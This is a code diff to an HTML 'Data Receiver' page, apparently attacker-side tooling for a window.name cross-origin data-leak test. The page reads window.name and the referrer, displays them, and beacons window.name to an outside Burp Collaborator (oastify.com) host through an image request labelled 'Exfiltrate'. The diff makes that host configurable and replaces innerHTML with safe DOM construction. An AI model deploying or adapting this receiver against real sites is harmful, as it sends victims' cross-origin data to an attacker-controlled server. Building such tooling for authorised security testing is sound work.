@@ -5,16 +5,25 @@
 <h1>Data Receiver</h1>
 <div id="data" style="word-wrap:break-word;max-width:800px;"></div>
 <script>
-const EXFIL = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
+const EXFIL = new URLSearchParams(location.search).get('exfil') || 'https://YOUR_COLLABORATOR_ID.oastify.com';
 
 // Read window.name
 const name = window.name;
 const ref = document.referrer;
 
-document.getElementById('data').innerHTML = 
-    '<strong>Window Name:</strong> ' + (name || '(empty)') + '<br><br>' +
-    '<strong>Referrer:</strong> ' + (ref || '(none)') + '<br><br>' +
-    '<strong>Length:</strong> ' + name.length + ' chars';
+const dataDiv = document.getElementById('data');
+const nameLabel = document.createElement('strong');
+nameLabel.textContent = 'Window Name: ';
+const nameText = document.createTextNode((name || '(empty)'));
+const refLabel = document.createElement('strong');
+refLabel.textContent = 'Referrer: ';
+const refText = document.createTextNode((ref || '(none)'));
+const lenLabel = document.createElement('strong');
+lenLabel.textContent = 'Length: ';
+const lenText = document.createTextNode(name.length + ' chars');
+[nameLabel, nameText, document.createElement('br'), document.createElement('br'),
+ refLabel, refText, document.createElement('br'), document.createElement('br'),
+ lenLabel, lenText].forEach(el => dataDiv.appendChild(el));
 
 // Exfiltrate
 new Image().src = EXFIL + '/?name=' + encodeURIComponent(name);
